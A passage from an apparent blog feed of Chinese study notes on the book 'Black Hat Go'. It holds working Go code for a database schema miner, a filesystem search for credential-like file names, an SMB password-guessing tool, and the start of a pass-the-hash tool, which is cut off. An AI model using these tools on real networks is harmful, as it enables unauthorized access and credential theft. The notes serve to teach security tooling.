TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM columns</span></span><br><span class="line"><span class="string">   WHERE TABLE_SCHEMA NOT IN (&#x27;mysql&#x27;, &#x27;information_schema&#x27;, &#x27;performance_schema&#x27;, &#x27;sys&#x27;)</span></span><br><span class="line"><span class="string">   ORDER BY TABLE_SCHEMA, TABLE_NAME`</span>  <span class="comment">//sql查询语句</span></span><br><span class="line">   schemarows, err := m.Db.Query(sql)  <span class="comment">//查询数据结果(*Row)</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> schemarows.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> prevschema, prevtable <span class="type">string</span> <span class="comment">//创建变量跟踪当前行的信息</span></span><br><span class="line">   <span class="keyword">var</span> db dbminer.Database  <span class="comment">//当前库，存放表</span></span><br><span class="line">   <span class="keyword">var</span> table dbminer.Table  <span class="comment">//当前表，存放列</span></span><br><span class="line">   <span class="keyword">for</span> schemarows.Next() &#123; <span class="comment">//遍历结果，目的是为了区分不同数据库或表的数据</span></span><br><span class="line">      <span class="keyword">var</span> currschema, currtable, currcol <span class="type">string</span></span><br><span class="line">      <span class="keyword">if</span> err := schemarows.Scan(&amp;currschema, &amp;currtable, &amp;currcol); err != <span class="literal">nil</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         1.检查当前行的库名是否与上一行不同</span></span><br><span class="line"><span class="comment">         2.如果是，创建新的miner.Database实例</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> currschema != prevschema &#123;</span><br><span class="line">         <span class="keyword">if</span> prevschema != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">            db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">            s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line">         &#125;</span><br><span class="line">         db = dbminer.Database&#123;Name: currschema, Tables: []dbminer.Table&#123;&#125;&#125;</span><br><span class="line">         prevschema = currschema</span><br><span class="line">         prevtable = <span class="string">&quot;&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         1.检查当前行的表名是否与上一行不同</span></span><br><span class="line"><span class="comment">         2.如果是，创建新的miner.Table实例</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">if</span> currtable != prevtable &#123;</span><br><span class="line">         <span class="keyword">if</span> prevtable != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">            db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">         &#125;</span><br><span class="line">         table = dbminer.Table&#123;Name: currtable, Columns: []<span class="type">string</span>&#123;&#125;&#125;</span><br><span class="line">         prevtable = currtable</span><br><span class="line">      &#125;</span><br><span class="line">      table.Columns = <span class="built_in">append</span>(table.Columns, currcol)</span><br><span class="line">   &#125;</span><br><span class="line">   db.Tables = <span class="built_in">append</span>(db.Tables, table)</span><br><span class="line">   s.Databases = <span class="built_in">append</span>(s.Databases, db)</span><br><span class="line">   <span class="keyword">if</span> err := schemarows.Err(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> s, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   mm, err := New(os.Args[<span class="number">1</span>])</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> mm.Db.Close() <span class="comment">//和MongoDB不同的是，需要关闭连接</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> err := dbminer.Search(mm); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="built_in">panic</span>(err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>输出结果与上个MongoDB示例的几乎没有区别，这是因为dbminer.Schema模式没有生成函数dbminer.Search()的任何输出。</p></li><li><p>这就是接口的力量，统一性和重用性</p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230202121458463.png" alt="image-20230202121458463"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.3掠夺文件系统</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/7.3%E6%8E%A0%E5%A4%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/7.3%E6%8E%A0%E5%A4%BA%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<ul><li>以递归方式遍历用户提供的文件系统路径，并与一系列有兴趣的文件名匹配</li><li>这些文件名在后渗透的工作中可能有用(可能包含凭证或敏感信息)</li></ul><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">   <span class="string">&quot;fmt&quot;</span></span><br><span class="line">   <span class="string">&quot;log&quot;</span></span><br><span class="line">   <span class="string">&quot;os&quot;</span></span><br><span class="line">   <span class="string">&quot;path/filepath&quot;</span>  <span class="comment">//轻松遍历目录结构</span></span><br><span class="line">   <span class="string">&quot;regexp&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> regexes = []*regexp.Regexp&#123;    <span class="comment">//正则匹配集</span></span><br><span class="line">   regexp.MustCompile(<span class="string">`(?i)user`</span>),</span><br><span class="line">   regexp.MustCompile(<span class="string">`(?i)password`</span>),</span><br><span class="line">   regexp.MustCompile(<span class="string">`(?i)kdb`</span>),</span><br><span class="line">   regexp.MustCompile(<span class="string">`(?i)login`</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">walkFn</span><span class="params">(path <span class="type">string</span>, f os.FileInfo, err <span class="type">error</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> _, r := <span class="keyword">range</span> regexes &#123;</span><br><span class="line">      <span class="keyword">if</span> r.MatchString(path) &#123;</span><br><span class="line">         fmt.Printf(<span class="string">&quot;[+] HIT: %s\n&quot;</span>, path)</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   root := os.Args[<span class="number">1</span>]  <span class="comment">//获取命令行参数</span></span><br><span class="line">   <span class="keyword">if</span> err := filepath.Walk(root, walkFn); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131150858728.png" alt="image-20230131150858728"></p><p><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131150914316.png" alt="image-20230131150914316"></p><h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><ol><li>包含更多特定的正则表达式</li><li>仅对文件名而不对目录应用正则表达式检查<ul><li>为什么要这样？看下面这个案例。1是空目录，空目录命中条件输出对我们获取敏感信息没有任何帮助</li><li><img src="https://cdn.jsdelivr.net/gh/Azh3n/blog-img/image-20230131151429861.png" alt="image-20230131151429861"></li></ul></li><li>查找和标记包含最近修改或访问时间的特定文件</li></ol>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>7.1连接和查询数据库</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/7.1%E8%BF%9E%E6%8E%A5%E5%92%8C%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/7.1%E8%BF%9E%E6%8E%A5%E5%92%8C%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><h4 id="1-安装MongoDB数据库然后写入数据"><a href="#1-安装MongoDB数据库然后写入数据" class="headerlink" title="1.安装MongoDB数据库然后写入数据"></a>1.安装<code>MongoDB</code>数据库然后写入数据</h4><ul><li>MongoDB是<code>NOSQL</code>数据库，他与其他传统数据库不同，是无架构的。</li><li>使用docker开启了之后，使用<code>store</code>数据库</li></ul><blockquote><p>db.use strore</p></blockquote><ul><li>写入数据</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">db.transactions.insert([</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;ccnum&quot;: &quot;4444333322221111&quot;,</span><br><span class="line">    &quot;date&quot;: &quot;2019-01-05&quot;,</span><br><span class="line">    &quot;amount&quot;: <span class="number">100.12</span>,</span><br><span class="line">    &quot;cvv&quot;: &quot;1234&quot;,</span><br><span class="line">    &quot;exp&quot;: &quot;09/2020&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;ccnum&quot;: &quot;4444123456789012&quot;,</span><br><span class="line">    &quot;date&quot;: &quot;2019-01-07&quot;,</span><br><span class="line">    &quot;amount&quot;: <span class="number">2400.18</span>,</span><br><span class="line">    &quot;cvv&quot;: &quot;5544&quot;,</span><br><span class="line">    &quot;exp&quot;: &quot;02/2021&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    &quot;ccnum&quot;: &quot;4465122334455667&quot;,</span><br><span class="line">    &quot;date&quot;: &quot;2019-01-29&quot;,</span><br><span class="line">    &quot;amount&quot;: <span class="number">1450.87</span>,</span><br><span class="line">    &quot;cvv&quot;: &quot;9876&quot;,</span><br><span class="line">    &quot;exp&quot;: &quot;06/2020&quot;</span><br><span class="line">  &#125;</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><h4 id="2-下载包并写入代码"><a href="#2-下载包并写入代码" class="headerlink" title="2. 下载包并写入代码"></a>2. 下载包并写入代码</h4><ul><li>需要先下载包，因为官方没有与<code>NoSQL</code>直接交互的包，所以我们安装如下mongo的驱动：<code>go get gopkg.in/mgo.v2</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Transaction <span class="keyword">struct</span> &#123;</span><br><span class="line">CCNum      <span class="type">string</span>  <span class="string">`bson:&quot;ccnum&quot;`</span></span><br><span class="line">Date       <span class="type">string</span>  <span class="string">`bson:&quot;date&quot;`</span></span><br><span class="line">Amount     <span class="type">float32</span> <span class="string">`bson:&quot;amount&quot;`</span></span><br><span class="line">Cvv        <span class="type">string</span>  <span class="string">`bson:&quot;cvv&quot;`</span></span><br><span class="line">Expiration <span class="type">string</span>  <span class="string">`bson:&quot;exp&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">session, err := mgo.Dial(<span class="string">&quot;192.168.68.137&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"></span><br><span class="line">results := <span class="built_in">make</span>([]Transaction, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> err := session.DB(<span class="string">&quot;store&quot;</span>).C(<span class="string">&quot;transactions&quot;</span>).Find(<span class="literal">nil</span>).All(&amp;results); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, txn := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Println(txn.CCNum, txn.Date, txn.Amount, txn.Cvv, txn.Expiration)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="1-创建mysql-数据库，并且写入数据"><a href="#1-创建mysql-数据库，并且写入数据" class="headerlink" title="1.创建mysql 数据库，并且写入数据"></a>1.创建mysql 数据库，并且写入数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>PLAINTEXT</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> database store;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span>  transactions(</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> ccnum <span class="type">varchar</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> <span class="type">date</span> <span class="type">date</span>,</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> amount <span class="type">decimal</span>(<span class="number">7</span>,<span class="number">2</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> cvv <span class="type">char</span>(<span class="number">4</span>),</span><br><span class="line">    <span class="operator">-</span><span class="operator">&gt;</span> exp <span class="type">date</span>);</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">SQL</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444333322221111&#x27;</span>, <span class="string">&#x27;2019-01-05&#x27;</span>, <span class="number">100.12</span>, <span class="string">&#x27;1234&#x27;</span>, <span class="string">&#x27;2020-09-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4444123456789012&#x27;</span>, <span class="string">&#x27;2019-01-07&#x27;</span>, <span class="number">2400.18</span>, <span class="string">&#x27;5544&#x27;</span>, <span class="string">&#x27;2021-02-01&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> transactions(ccnum, <span class="type">date</span>, amount, cvv, exp) <span class="keyword">values</span> (<span class="string">&#x27;4465122334455667&#x27;</span>, <span class="string">&#x27;2019-01-29&#x27;</span>, <span class="number">1450.87</span>, <span class="string">&#x27;9876&#x27;</span>, <span class="string">&#x27;2020-06-01&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="2-编写代码"><a href="#2-编写代码" class="headerlink" title="2. 编写代码"></a>2. 编写代码</h3><p><code>Go</code>包包含了一个<code>database/sql</code>的标准包</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/<span class="keyword">go</span>-sql-driver/mysql</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">db,err := sql.Open(<span class="string">&quot;mysql&quot;</span>,<span class="string">&quot;root:root@tcp(127.0.0.1:3306)/store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> db.Close()</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ccnum,date,cvv,exp <span class="type">string</span></span><br><span class="line">amount  <span class="type">float32</span></span><br><span class="line">)</span><br><span class="line">rows,err := db.Query(<span class="string">&quot;SELECT ccnum,date,amount,cvv,exp FROM transactions &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> rows.Close()</span><br><span class="line"><span class="keyword">for</span> rows.Next() &#123;</span><br><span class="line">err := rows.Scan(&amp;ccnum,&amp;date,&amp;amount,&amp;cvv,&amp;exp)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(ccnum,date,cvv,exp)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> rows.Err() != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Panicln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><ul><li>使用不同的后端数据库仅需要对代码进行以下较小的改动<ol><li>导入正确的数据库驱动程序</li><li>更改传递给sql.Open()的参数</li><li>根据后端数据库类型调整SQL语法</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.与SMB和NTLM交互</title>
      <link href="/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/6.%E4%B8%8ESMB%E5%92%8CNTLM%E4%BA%A4%E4%BA%92/"/>
      <url>/2023/02/01/Go/Go%E6%B8%97%E9%80%8F%E7%BC%96%E7%A8%8B/6.%E4%B8%8ESMB%E5%92%8CNTLM%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<p>SMB具有多种用途，但通常用于在网上共享资源，例如文件、打印机和串行端口。且SMB允许你通过命名管道在分布式网络节点之间进行进程通信，也就是允许我们在远程主机上执行任意命令。这需要用到PsExec。而同时SMB也被证明是针对Windows系统后渗透最有用的协议。</p><p>SMB还有一些其他有趣的用途，这主要得益于它处理NT LAN Manager（NTLM）身份验证的方式，该身份验证是Windows网络上大量使用的质询-响应安全协议。这些用途包括远程密码猜解、给予散列的身份验证、SMB中继和NBNS&#x2F;LLMNR欺骗。</p><p>而在go中还没有一个正式的SMB包来让我们进行与SMB的交互，于是本书作者创建了一个与本书配套的SMB包供我们使用。</p><p>具体地址：<a href="https://github.com/blackhat-go/bhg/ch-6/smb">https://github.com/blackhat-go/bhg/ch-6/smb</a></p><h2 id="使用SMB包猜解密码"><a href="#使用SMB包猜解密码" class="headerlink" title="使用SMB包猜解密码"></a>使用SMB包猜解密码</h2><p>go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/smb&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage:main &lt;/user/file&gt; &lt;password&gt; &lt;domain&gt; &lt;target_host&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">buf ,err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">options := smb.Options &#123;</span><br><span class="line">Password: os.Args[<span class="number">2</span>],</span><br><span class="line">Domain: os.Args[<span class="number">3</span>],</span><br><span class="line">Host: os.Args[<span class="number">4</span>],</span><br><span class="line">Port: <span class="number">445</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users := bytes.Split(buf,[]<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _,user := <span class="keyword">range</span> users &#123;</span><br><span class="line">options.User = <span class="type">string</span>(user)</span><br><span class="line">session, err := smb.NewSession(options, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[-] Login failed: %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"><span class="keyword">if</span> session.IsAuthenticated &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Success : %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们来编写一个利用smb对域密码进行爆破的工具，在21行，我们首先利用作者写好的smb包创建一个smb消息，其中包括了域、密码、主机地址和端口，然后从我们的用户字典中读取用户名，此时一个完整的smb需要的结构体需要的内容已经被补齐。然后利用smb包创建一个Session并发送给主机验证（31行），这个函数在后台进行了大量的操作，包括协商SMB防疫和身份验证机制，然后对远程目标进行身份验证，如果身份验证失败，该函数将返回错误，并根据结果填充结果题session中布尔类型的字段IsAuthenticated。然后检查该值来判断认证是否成功。</p><h2 id="通过pass-the-hash技术重用密码"><a href="#通过pass-the-hash技术重用密码" class="headerlink" title="通过pass-the-hash技术重用密码"></a>通过pass-the-hash技术重用密码</h2><p>通过pass-the-hashJishu ,即使我们没有明文密码，我们也可以使用密码的NTLM散列进行SMB身份验证。其之所以有效，是因为在域中存储在任意地方的散列值都被认为是预先计算好的，因此我们不需要提供域、用户和密码来计算用户的散列值。</p><p>go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/smb&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage:main &lt;target/hosts&gt; &lt;user&gt; &lt;domain&gt; &lt;hash&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf , err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">options := smb.Options&#123;</span><br><span class="line">User : os.Args[<span class="number">2</span>],</span><br><span class="line">Domain : os.Args[<span class="number">3</span>],</span><br><span class="line">Hash : os.Args[<span class="number">4</span>],</span><br><span class="line">Port : <span class="number">445</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">targets := bytes.Split(buf, []<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _,target := <span class="keyword">range</span> targets &#123;</span><br><span class="line">options.Host = <span class="type">string</span>(target)</span><br><span class="line"></span><br><span class="line">session, err := smb.NewSession(options,<span class="literal">false</span>)</span><br><span 